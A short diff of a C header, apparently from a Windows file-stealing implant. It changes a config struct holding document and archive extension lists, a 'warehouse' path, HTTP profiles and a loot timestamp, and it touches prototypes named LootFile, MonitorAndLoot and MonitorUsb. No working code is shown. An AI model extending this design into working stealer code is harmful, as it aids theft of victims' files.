@@ -79,11 +79,9 @@ struct _GLOBAL_CONFIG {
 	DWORD cDocumentExtensions;
 	LPWSTR* ArchiveExtensions;
 	DWORD cArchiveExtensions;
-	LPWSTR* MonitoredFolder;
-	DWORD dwNumberOfMonitoredFolder;
 	WCHAR wszWarehouse[MAX_PATH];
 	BOOL StoppingMonitor;
-	HDEVNOTIFY hDevNotify;
+	FILETIME LastLootTime;
 
 	PHTTP_PROFILE* HttpProfiles;
 	DWORD cHttpProfiles;
@@ -284,10 +282,10 @@ VOID LootFile
 	_In_ PGLOBAL_CONFIG pConfig
 );
 
-VOID MonitorAndLoot
-(
-	_In_ PGLOBAL_CONFIG pConfig
-);
+//VOID MonitorAndLoot
+//(
+//	_In_ PGLOBAL_CONFIG pConfig
+//);
 
 VOID MonitorUsb
 (
